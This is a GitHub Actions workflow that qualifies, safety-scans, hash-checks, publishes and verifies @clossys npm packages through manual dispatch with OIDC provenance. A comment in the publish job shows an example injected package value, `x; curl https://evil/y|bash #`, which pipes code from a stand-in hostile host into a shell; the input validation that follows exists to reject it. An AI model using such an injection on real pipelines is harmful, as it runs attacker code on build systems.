name: Publish

# This workflow's only trigger is workflow_dispatch below — there is no push
# trigger. A merged package version bump is NOT itself a release: it
# publishes nothing until a person notices the bump landed and manually
# dispatches this workflow with dry_run: false (see issue #757).
#
# The discovery job still selects a manifest whose version has no registry
# counterpart yet (see scripts/select-publishable-packages.mjs and
# scripts/registry-version-lookup.mjs) — registry-versus-manifest, not a
# diff of any one run — which is why re-dispatching after a publish was
# evicted from the concurrency queue below, or lost to a timeout or
# failure, still resolves to the right package. But that re-dispatch is a
# manual act, not an automatic one: without a push trigger there is no
# "next run" for a lost publish to be picked up by. A cancelled or failed
# run stays unpublished until a human notices it in the run list and
# dispatches again themselves; see issue #416 for the discovery logic this
# was originally designed alongside. Manual dispatch is also how a
# brand-new package's very first version is bootstrap-published and how
# preflight dry-runs are exercised, since the registry-driven discovery
# above deliberately never auto-selects a package with no registry
# counterpart at all (see registry-version-lookup.mjs's header for why).
on:
  workflow_dispatch:
    inputs:
      package:
        description: Package directory under packages/
        required: true
        type: string
      release_target:
        description: >-
          Optional explicit release-catalogue target. Leave empty for the
          current exact all-19 @clossys public-npm launch target;
          another target requires a separately reviewed catalogue change.
        required: false
        default: ""
        type: string
      dry_run:
        description: Run npm publish --dry-run only
        required: true
        default: true
        type: boolean
      verify_only:
        description: >-
          Qualify an already-published package without uploading or changing
          its visibility. Fetches the registry tarball and runs its isolated
          consumer verification.
        required: true
        default: false
        type: boolean

permissions:
  contents: read

concurrency:
  # Publishing is serial across packages and across runs of this
  # workflow_dispatch-triggered workflow (there is no push trigger to be
  # serial across). A later version must never race an earlier tarball
  # through the same registry namespace.
  group: publish
  cancel-in-progress: false

jobs:
  discover:
    runs-on: ubuntu-latest
    outputs:
      packages: ${{ steps.packages.outputs.matrix }}
    steps:
      # No longer needs full history (fetch-depth: 0): selection now compares
      # the checked-out working tree's manifests against the registry, not
      # two commits against each other.
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0

      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
        with:
          node-version: 20

      - id: packages
        name: Select packages with a version missing from the registry
        env:
          EVENT_NAME: ${{ github.event_name }}
          MANUAL_PACKAGE: ${{ inputs.package }}
          PUBLISH_RELEASE_TARGET: ${{ inputs.release_target }}
        run: |
          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
            node scripts/check-release-catalog.mjs --package "$MANUAL_PACKAGE"
            echo "matrix=$(node -e 'console.log(JSON.stringify([{ package: process.env.MANUAL_PACKAGE }]))')" >> "$GITHUB_OUTPUT"
          else
            matrix="$(node scripts/select-publishable-packages.mjs)"
            echo "matrix=$matrix" >> "$GITHUB_OUTPUT"
          fi

      # Publishing requires qualify -> RETAIN the record -> publish, in that
      # order. `validate-candidate-publish` already enforces that join, but it
      # runs inside the `publish` job, behind the `npm-publish` environment —
      # so a missing record used to surface only after a human had approved
      # the deployment, as a raw ENOENT (issue #769). The cost of that is not
      # the minutes, it is the spent approval.
      #
      # Asking the same question here, before the environment gate, stops the
      # run while it is still free. This does not replace the publish-time
      # join: that one binds the exact tarball, this one only answers whether
      # the record exists at all.
      #
      # Gated to the runs that can actually spend an approval. The `publish`
      # job uploads only on `dry_run: false` (see its own comment), and the
      # dry-run itself happens inside `qualify` — so a `dry_run: true`
      # dispatch is exactly how a NEW version's record gets produced in the
      # first place, from the `qualified-candidate-*` artifact that job
      # uploads. Blocking it on the record's existence would demand the thing
      # the run exists to create, and there would be no way to qualify a new
      # version at all. That regression shipped in #777 and is fixed here.
      - name: Preflight retained qualification records
        if: ${{ !inputs.dry_run && !inputs.verify_only }}
        env:
          MATRIX: ${{ steps.packages.outputs.matrix }}
        run: |
          set -euo pipefail
          missing=0
          for key in $(node -e 'for (const e of JSON.parse(process.env.MATRIX)) console.log(e.package)'); do
            node scripts/check-qualification-record-present.mjs --package "$key" || missing=1
          done
          if [ "$missing" -ne 0 ]; then
            echo "::error title=Missing qualification record::A selected package has no retained qualification record. Retain it on the default branch before dispatching a publish."
            exit 1
          fi

  fetch-published:
    needs: discover
    if: ${{ github.event_name == 'workflow_dispatch' && inputs.verify_only && needs.discover.outputs.packages != '[]' }}
    permissions:
      contents: read
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 1
      matrix:
        include: ${{ fromJSON(needs.discover.outputs.packages) }}
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
        with:
          persist-credentials: false

      - name: Fetch exact public npm tarball anonymously
        env:
          PKG: ${{ matrix.package }}
          PUBLISH_RELEASE_TARGET: ${{ inputs.release_target }}
        run: |
          destination="$RUNNER_TEMP/published/$PKG"
          node scripts/fetch-public-npm-artifact.mjs --package "$PKG" --output "$destination"

      - name: Upload published candidate
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7
        with:
          name: published-candidate-${{ matrix.package }}
          path: |
            ${{ runner.temp }}/published/${{ matrix.package }}/candidate.tgz
            ${{ runner.temp }}/published/${{ matrix.package }}/registry-proof.json
          if-no-files-found: error

  qualify:
    needs: [discover, fetch-published]
    if: ${{ always() && needs.discover.outputs.packages != '[]' && (!inputs.verify_only || needs.fetch-published.result == 'success') }}
    permissions:
      contents: read
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 1
      matrix:
        include: ${{ fromJSON(needs.discover.outputs.packages) }}
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
        with:
          fetch-depth: 0
          persist-credentials: false

      # Candidate qualification must replay on the same credential-free runtime
      # as the OIDC upload lane. Do not inherit an ubuntu-latest ambient npm.
      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
        with:
          node-version: 24.19.0

      - name: Assert replay toolchain
        run: |
          test "$(node --version)" = 'v24.19.0'
          test "$(npm --version)" = '11.17.0'
          test "$(node -p 'process.versions.zlib')" = '1.3.2.1-motley-3246f1b'

      - name: Validate package input
        env:
          PKG: ${{ matrix.package }}
          VERIFY_ONLY: ${{ inputs.verify_only }}
          PUBLISH_RELEASE_TARGET: ${{ inputs.release_target }}
        run: |
          if ! [[ "$PKG" =~ ^[a-zA-Z0-9_-]+$ ]]; then
            echo "::error title=Invalid package input::package must match ^[a-zA-Z0-9_-]+\$ (got: $PKG)"
            exit 1
          fi
          if [ ! -f "packages/$PKG/package.json" ]; then
            echo "::error title=Unknown package::packages/$PKG/package.json does not exist."
            exit 1
          fi
          node scripts/check-release-catalog.mjs --package "$PKG"

      - name: Install repository dependencies without lifecycle scripts
        if: ${{ !inputs.verify_only }}
        run: npm ci --ignore-scripts

      - name: Build and run repository checks
        if: ${{ !inputs.verify_only }}
        run: |
          npm run build
          npm run check:candidate-qualification
          npm run check:package-governance
          npm run typecheck
          npm test

      - name: Pack one pre-publication candidate
        if: ${{ !inputs.verify_only }}
        working-directory: packages/${{ matrix.package }}
        env:
          PKG: ${{ matrix.package }}
        run: |
          set -euo pipefail
          destination="$RUNNER_TEMP/qualification/$PKG"
          mkdir -p "$destination"
          result="$(npm pack --ignore-scripts --json --pack-destination "$destination")"
          filename="$(node -e 'console.log(JSON.parse(process.argv[1])[0].filename)' "$result")"
          mv "$destination/$filename" "$destination/candidate.tgz"

      - name: Download published candidate for verification
        if: ${{ inputs.verify_only }}
        uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131 # v7
        with:
          name: published-candidate-${{ matrix.package }}
          path: ${{ runner.temp }}/qualification/${{ matrix.package }}/download

      - name: Select exact qualification tarball
        env:
          PKG: ${{ matrix.package }}
          VERIFY_ONLY: ${{ inputs.verify_only }}
        run: |
          set -euo pipefail
          destination="$RUNNER_TEMP/qualification/$PKG"
          if [ "$VERIFY_ONLY" = true ]; then
            source="$destination/download/candidate.tgz"
            proof="$destination/download/registry-proof.json"
            [ -f "$source" ] || { echo '::error title=Missing published artifact::download did not contain candidate.tgz.'; exit 1; }
            [ -f "$proof" ] || { echo '::error title=Missing registry proof::download did not contain registry-proof.json.'; exit 1; }
            cp "$source" "$destination/candidate.tgz"
            cp "$proof" "$destination/registry-proof.json"
          fi
          [ -f "$destination/candidate.tgz" ] || { echo '::error title=Missing qualification artifact::no candidate tarball was produced.'; exit 1; }
          sha1sum "$destination/candidate.tgz"
          sha256sum "$destination/candidate.tgz"
          sha512sum "$destination/candidate.tgz"

      - name: Validate anonymous public npm registry proof
        if: ${{ inputs.verify_only }}
        env:
          PKG: ${{ matrix.package }}
          TARBALL: ${{ runner.temp }}/qualification/${{ matrix.package }}/candidate.tgz
          PROOF: ${{ runner.temp }}/qualification/${{ matrix.package }}/registry-proof.json
        run: node scripts/validate-public-npm-registry-proof.mjs --package "$PKG" --tarball "$TARBALL" --proof "$PROOF"

      - name: Run fixed candidate qualification credential-free
        env:
          PKG: ${{ matrix.package }}
          TARBALL: ${{ runner.temp }}/qualification/${{ matrix.package }}/candidate.tgz
          TRANSCRIPT: ${{ runner.temp }}/qualification/${{ matrix.package }}/transcript.json
        run: node scripts/run-candidate-qualification.mjs --package "$PKG" --tarball "$TARBALL" --output "$TRANSCRIPT"

      - name: Exercise directory-form OIDC publish command without upload credentials
        if: ${{ github.event_name == 'workflow_dispatch' && inputs.dry_run && !inputs.verify_only }}
        working-directory: packages/${{ matrix.package }}
        run: |
          set -euo pipefail
          registry="$(node -p "JSON.parse(require('fs').readFileSync('../../package-scope.json','utf8')).registry")"
          status=0
          output="$(npm publish . --dry-run --provenance --access public --ignore-scripts --registry "$registry" 2>&1)" || status=$?
          printf '%s\n' "$output"
          if [ "$status" -ne 0 ]; then
            exit "$status"
          fi
          if printf '%s\n' "$output" | grep -E -q 'npm auto-corrected|bin\[[^]]+\].*(invalid|removed)'; then
            echo '::error title=Publish dry-run changed the manifest::npm auto-corrected the package manifest; refusing to publish a different bin map.'
            exit 1
          fi

      - name: Upload exact candidate and qualification transcript
        if: ${{ always() }}
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7
        with:
          name: qualified-candidate-${{ matrix.package }}
          path: |
            ${{ runner.temp }}/qualification/${{ matrix.package }}/candidate.tgz
            ${{ runner.temp }}/qualification/${{ matrix.package }}/transcript.json
            ${{ runner.temp }}/qualification/${{ matrix.package }}/registry-proof.json
          if-no-files-found: ignore

  publish:
    needs: [discover, qualify]
    # Deliberately manual and non-dry-run only: this job uploads only on a
    # workflow_dispatch run to main with dry_run: false. There is no push
    # trigger that could reach this job at all (see the workflow header), so
    # a merged version bump alone can never upload — a human dispatch is
    # required every time. Qualification still fails closed unless the exact
    # immutable pre-publication record exists.
    if: ${{ always() && !cancelled() && needs.discover.result == 'success' && needs.qualify.result == 'success' && github.event_name == 'workflow_dispatch' && github.ref == 'refs/heads/main' && !inputs.dry_run && !inputs.verify_only && needs.discover.outputs.packages != '[]' }}
    permissions:
      contents: read
      id-token: write
    runs-on: ubuntu-latest
    # A package upload must pass the repository's configured publish reviewer.
    # Qualification and anonymous verification stay outside this environment.
    environment: npm-publish
    strategy:
      fail-fast: false
      max-parallel: 1
      matrix:
        include: ${{ fromJSON(needs.discover.outputs.packages) }}
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
        with:
          fetch-depth: 0
          persist-credentials: false

      # Keep the OIDC upload lane on the exact runtime that qualified the
      # immutable handoff; setup-node's bundled npm is asserted below.
      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
        with:
          node-version: 24.19.0

      - name: Assert replay toolchain
        run: |
          test "$(node --version)" = 'v24.19.0'
          test "$(npm --version)" = '11.17.0'
          test "$(node -p 'process.versions.zlib')" = '1.3.2.1-motley-3246f1b'

      - name: Download exact qualified candidate
        uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131 # v7
        with:
          name: qualified-candidate-${{ matrix.package }}
          path: ${{ runner.temp }}/qualification/${{ matrix.package }}

      # package-scope.json is the single source of truth for the exact registry
      # and scope. The npm trusted-publisher binding is repository/workflow/
      # environment-specific; this source tuple additionally prevents the
      # command from being redirected to a different registry.
      - name: Read registry and scope from package-scope.json
        id: scope
        run: |
          echo "registry=$(node -p "JSON.parse(require('fs').readFileSync('package-scope.json','utf8')).registry")" >> "$GITHUB_OUTPUT"
          echo "scope=$(node -p "JSON.parse(require('fs').readFileSync('package-scope.json','utf8')).scope")" >> "$GITHUB_OUTPUT"

      # matrix.package is either a version-selected package or the manual
      # workflow_dispatch string. Every step
      # below either passes it as a script argument or splices it into a
      # run: script body — validate its shape once, up front, so a value like
      # `x; curl https://evil/y|bash #` fails closed right here instead of
      # being textually substituted into a shell command later.
      - name: Validate package input
        env:
          PKG: ${{ matrix.package }}
          VERIFY_ONLY: ${{ inputs.verify_only }}
          PUBLISH_RELEASE_TARGET: ${{ inputs.release_target }}
        run: |
          if ! [[ "$PKG" =~ ^[a-zA-Z0-9_-]+$ ]]; then
            echo "::error title=Invalid package input::package must match ^[a-zA-Z0-9_-]+\$ (got: $PKG)"
            exit 1
          fi
          if [ ! -f "packages/$PKG/package.json" ]; then
            echo "::error title=Unknown package::packages/$PKG/package.json does not exist."
            exit 1
          fi
          node scripts/check-release-catalog.mjs --package "$PKG"

      # This is the only failure mode that damages a package OTHER than the
      # one being published. GitHub Packages namespaces by owner account, not
      # by package name — publishing a name another repo already owns doesn't
      # fail, it silently appends a new version to that package and moves its
      # latest tag. Everything else in this workflow can only hurt the
      # package being published; this check runs first because it is the one
      # that can hurt someone else's. This org was created specifically to own
      # this owner to publish packages. Non-publishing account-control-plane
      # repositories may coexist, so the owner-wide check still runs; a false
      # negative here is unrecoverable.
      - name: name collision
        env:
          PKG: ${{ matrix.package }}
        run: node scripts/check-name-collision.mjs "packages/$PKG"

      # FULL mode is mandatory here. --require-denylist makes a missing secret
      # exit 2 rather than pass on a degraded scan; a publish must never be
      # cleared by a partial one.
      - name: Materialise denylist
        env:
          DENYLIST_B64: ${{ secrets.PUBLIC_SAFETY_DENYLIST_B64 }}
        run: |
          if [ -z "$DENYLIST_B64" ]; then
            echo "::error title=Cannot publish::PUBLIC_SAFETY_DENYLIST_B64 is not set. Refusing to publish on a partial safety scan."
            exit 1
          fi
          printf '%s' "$DENYLIST_B64" | base64 -d > "$RUNNER_TEMP/denylist.json"
          echo "PUBLIC_SAFETY_DENYLIST=$RUNNER_TEMP/denylist.json" >> "$GITHUB_ENV"

      - name: Safety gate (FULL, required)
        env:
          PKG: ${{ matrix.package }}
        run: |
          node scripts/check-public-safety.mjs "packages/$PKG" --require-denylist --allow-changelogs
          node scripts/check-public-safety.mjs . --require-denylist --allow-changelogs

      - name: README parity and contamination classes
        env:
          PKG: ${{ matrix.package }}
        run: |
          node scripts/check-readme-parity.mjs "packages/$PKG"
          node scripts/check-contamination-classes.mjs "packages/$PKG"

      - name: Scope declared
        run: |
          node scripts/set-scope.mjs --check
          scope="$(node -p "JSON.parse(require('fs').readFileSync('package-scope.json','utf8')).scope")"
          if [ -z "$scope" ] || [ "$scope" = "null" ]; then
            echo "::error title=Cannot publish::package-scope.json has no scope set."
            exit 1
          fi

      - name: Artifact safety (exact qualified tarball)
        env:
          PKG: ${{ matrix.package }}
          TARBALL: ${{ runner.temp }}/qualification/${{ matrix.package }}/candidate.tgz
        run: |
          set -euo pipefail
          TARBALL_SHA1="$(sha1sum "$TARBALL" | awk '{print $1}')"
          TARBALL_SHA256="$(sha256sum "$TARBALL" | awk '{print $1}')"
          TARBALL_SHA512="$(sha512sum "$TARBALL" | awk '{print $1}')"
          node scripts/check-artifact-safety.mjs "packages/$PKG" --tarball "$TARBALL" --sha1 "$TARBALL_SHA1" --sha256 "$TARBALL_SHA256" --sha512 "$TARBALL_SHA512" --require-denylist

      # The tarball is the thing that actually ships. Listing it is the last
      # chance to notice that `files` is letting something through. This
      # lists the CONTENTS OF THE EXACT FILE that gets published below, not a
      # separate dry-run pack.
      - name: Show tarball contents
        env:
          TARBALL: ${{ runner.temp }}/qualification/${{ matrix.package }}/candidate.tgz
        run: tar tzf "$TARBALL"

      - name: Validate qualification joins
        env:
          PKG: ${{ matrix.package }}
          TARBALL: ${{ runner.temp }}/qualification/${{ matrix.package }}/candidate.tgz
          TRANSCRIPT: ${{ runner.temp }}/qualification/${{ matrix.package }}/transcript.json
          VERIFY_ONLY: ${{ inputs.verify_only }}
        run: |
          if [ "$VERIFY_ONLY" = true ]; then mode=bootstrap; else mode=prepublish; fi
          node scripts/validate-candidate-publish.mjs --package "$PKG" --tarball "$TARBALL" --transcript "$TRANSCRIPT" --mode "$mode"

      - name: Verify exact tarball is unchanged
        if: ${{ !inputs.verify_only }}
        env:
          TARBALL: ${{ runner.temp }}/qualification/${{ matrix.package }}/candidate.tgz
          TRANSCRIPT: ${{ runner.temp }}/qualification/${{ matrix.package }}/transcript.json
        run: |
          set -euo pipefail
          expected_sha1="$(node -p "JSON.parse(require('fs').readFileSync(process.env.TRANSCRIPT,'utf8')).tarball.sha1")"
          expected_sha256="$(node -p "JSON.parse(require('fs').readFileSync(process.env.TRANSCRIPT,'utf8')).tarball.sha256")"
          expected_sha512="$(node -p "JSON.parse(require('fs').readFileSync(process.env.TRANSCRIPT,'utf8')).tarball.sha512")"
          actual_sha1="$(sha1sum "$TARBALL" | awk '{print $1}')"
          actual_sha256="$(sha256sum "$TARBALL" | awk '{print $1}')"
          actual_sha512="$(sha512sum "$TARBALL" | awk '{print $1}')"
          if [ "$actual_sha1" != "$expected_sha1" ] || [ "$actual_sha256" != "$expected_sha256" ] || [ "$actual_sha512" != "$expected_sha512" ]; then
            echo "::error title=Tarball mismatch::The qualified candidate changed after validation. Refusing to publish."
            exit 1
          fi

      - name: Publish
        env:
          PKG: ${{ matrix.package }}
          TARBALL: ${{ runner.temp }}/qualification/${{ matrix.package }}/candidate.tgz
        run: |
          set -euo pipefail
          test -f "$TARBALL"
          version="$(node -p "require('./packages/' + process.env.PKG + '/package.json').version")"
          record="governance/release-qualifications/clossys-$PKG-$version.json"
          # The wrapper extracts and FULL-scans the qualified tarball, proves
          # clean-directory SHA-1/SHA-256/SHA-512 parity, then invokes this
          # trusted OIDC upload as `npm publish .` from its private stage.
          #
          # This wrapper's own embedded post-publish verify (see
          # scripts/verify-post-publish-public-npm-artifact.mjs) exits 2 —
          # INDETERMINATE, this repository's convention for "could not
          # confirm" — when its bounded observation window merely runs out
          # on an upload that already, immutably, happened; it exits 1 only
          # for a genuine byte mismatch or an actual publish failure. `set
          # -e` is suspended around just this command so a 2 can be
          # inspected instead of aborting the step outright — that exact
          # abort is what skipped `verify-published` for controller@0.9.2
          # (issue #790).
          set +e
          node scripts/publish-qualified-directory.mjs --package "$PKG" --candidate "$TARBALL" --record "$record" --mode oidc
          status=$?
          set -e
          if [ "$status" -eq 2 ]; then
            echo "::warning title=Anonymous visibility indeterminate::${PKG}'s embedded post-publish observation window ended without anonymously confirming the upload. The upload already happened and is immutable; this is NOT a failure. The independent 'post-publish anonymous registry verification' job is the authoritative check and still runs."
            exit 0
          fi
          exit "$status"

      # This in-job probe has its own bounded observation window (see
      # scripts/lib/public-npm-registry.mjs) and can legitimately run out of
      # retries before the anonymous public npm edge has caught up with an
      # upload that already, immutably, happened. verify-post-publish-public-
      # npm-artifact.mjs exits 2 for exactly that case — INDETERMINATE, this
      # repository's convention for "could not confirm", never a failure —
      # and reserves exit 1 for a genuine byte mismatch. Only exit 1 (or any
      # other unexpected non-zero code) fails this step; exit 2 is reported
      # as a warning and does not fail the job, so a slow CDN edge never
      # skips the independent, authoritative `verify-published` job below
      # (issue #790 — that is exactly what happened to controller@0.9.2).
      - name: Verify anonymous public npm visibility and exact bytes
        env:
          PKG: ${{ matrix.package }}
          PUBLISH_RELEASE_TARGET: ${{ inputs.release_target }}
          EXPECTED_TARBALL: ${{ runner.temp }}/qualification/${{ matrix.package }}/candidate.tgz
        run: |
          set -uo pipefail
          node scripts/verify-post-publish-public-npm-artifact.mjs --package "$PKG" --expected-tarball "$EXPECTED_TARBALL"
          status=$?
          if [ "$status" -eq 2 ]; then
            echo "::warning title=Anonymous visibility indeterminate::${PKG}'s bounded post-publish observation window ended without anonymously confirming the upload. The upload already happened and is immutable; this is NOT a failure. The independent 'post-publish anonymous registry verification' job is the authoritative check and still runs."
            exit 0
          fi
          exit "$status"

      - name: Redact denylist
        if: always()
        run: rm -f "$RUNNER_TEMP/denylist.json"

  # Keep registry verification separate from upload so a failed read never
  # implies rollback of an immutable version. Public npm is read anonymously.
  verify-published:
    name: post-publish anonymous registry verification
    needs: [discover, publish]
    if: ${{ always() && needs.publish.result == 'success' && needs.discover.outputs.packages != '[]' }}
    permissions:
      contents: read
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 1
      matrix:
        include: ${{ fromJSON(needs.discover.outputs.packages) }}
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
        with:
          persist-credentials: false

      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
        with:
          node-version: "24"
          registry-url: https://registry.npmjs.org

      - name: Verify exact public npm artifact anonymously
        env:
          PKG: ${{ matrix.package }}
        run: node scripts/check-registry-parity.mjs --package "$PKG"

      - name: Verify exact Sigstore and SLSA provenance anonymously
        env:
          PKG: ${{ matrix.package }}
          SOURCE_SHA: ${{ github.sha }}
        run: |
          PACKAGE_NAME=$(node -p "require('./packages/' + process.env.PKG + '/package.json').name")
          PACKAGE_VERSION=$(node -p "require('./packages/' + process.env.PKG + '/package.json').version")
          PROVENANCE_ROOT=$(mktemp -d)
          trap 'rm -rf "$PROVENANCE_ROOT"' EXIT
          cd "$PROVENANCE_ROOT"
          npm init --yes >/dev/null
          npm install --ignore-scripts --save-exact "$PACKAGE_NAME@$PACKAGE_VERSION"
          npm audit signatures --json --include-attestations > audit-signatures.json
          cd "$GITHUB_WORKSPACE"
          node scripts/check-public-npm-provenance.mjs \
            --package "$PKG" \
            --audit-result "$PROVENANCE_ROOT/audit-signatures.json" \
            --source-sha "$SOURCE_SHA"
